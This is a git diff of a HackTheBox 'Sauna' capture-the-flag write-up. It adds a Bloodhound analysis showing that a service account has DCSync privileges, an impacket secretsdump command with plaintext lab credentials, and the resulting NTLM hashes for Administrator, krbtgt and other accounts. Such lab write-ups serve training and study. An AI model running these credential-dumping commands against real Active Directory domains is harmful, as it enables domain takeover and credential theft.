@@ -149,8 +149,9 @@ DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
 DefaultPassword               :  Moneymakestheworldgoround!
 ```
 
-New set of credentials: `svc_loanmanager:Moneymakestheworldgoround!`
+New set of credentials: `SVC_LOANMGR:Moneymakestheworldgoround!`
 
+**N.B.** username is still `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`, despite output from winpeas.
 
 ## Bloodhound Enumeration
 
@@ -160,13 +161,30 @@ Ran `bloodhound-python` to enumerate AD environment:
 bloodhound-python -ns 10.10.10.175 -d EGOTISTICAL-BANK.local -dc EGOTISTICAL-BANK.local -u fsmith -p Thestrokes23 -c All
 ```
 
-Uploaded JSON files to bloodhound and searched for our AD account `fsmith@EGOTISTICAL-BANK.LOCAL` and `svc_loanmanager@EGOTISTICAL-BANK.LOCAL` in Bloodhound in the search bar. Next, I right clicked the user nodes and marked them as owned. In the Queries tab, I selected the pre-built query "Shortest Path from Owned Principals".
+Uploaded JSON files to bloodhound and searched for our AD account `fsmith@EGOTISTICAL-BANK.LOCAL` and `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL` in Bloodhound in the search bar. Next, I right clicked the user nodes and marked them as owned. In the Queries tab, I selected the pre-built query "Shortest Path from Owned Principals".
 
 **N.B.** Bloodhound appears to default to the edge case CanPSRemote for both owned principles, deleted edge case to view other potential paths.
 
+![Bloodhound](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Sauna/Images/Bloodhound.png)
 
+Based on the output above, the user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain EGOTISTICAL-BANK.LOCAL. These two privileges allow a principal to perform a DCSync attack.
 
-lsadump::dcsync /user:dcorp\krbtgt
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175' -just-dc
+
+# Output
+*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:e972ec702fbffbeff010695dc5eed9dd:::
+......etc........
+```
+
 
 
 
